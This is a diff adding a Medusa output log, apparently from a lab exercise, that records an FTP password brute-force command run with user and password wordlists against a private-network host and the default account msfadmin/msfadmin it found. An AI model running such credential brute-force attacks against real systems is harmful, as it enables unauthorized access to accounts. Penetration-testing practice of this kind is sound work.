@@ -1,0 +1,4 @@
+# Medusa v.2.3 (2025-10-06 10:06:18)
+# medusa -h 192.168.52.160 -U wordlists/users_ftp.txt -P wordlists/pass_ftp.txt -M ftp -f -t 6 -O commands/medusa_ftp_output.txt 
+2025-10-06 10:06:21 ACCOUNT FOUND: [ftp] Host: 192.168.52.160 User: msfadmin Password: msfadmin [SUCCESS]
+# Medusa has finished (2025-10-06 10:06:24).
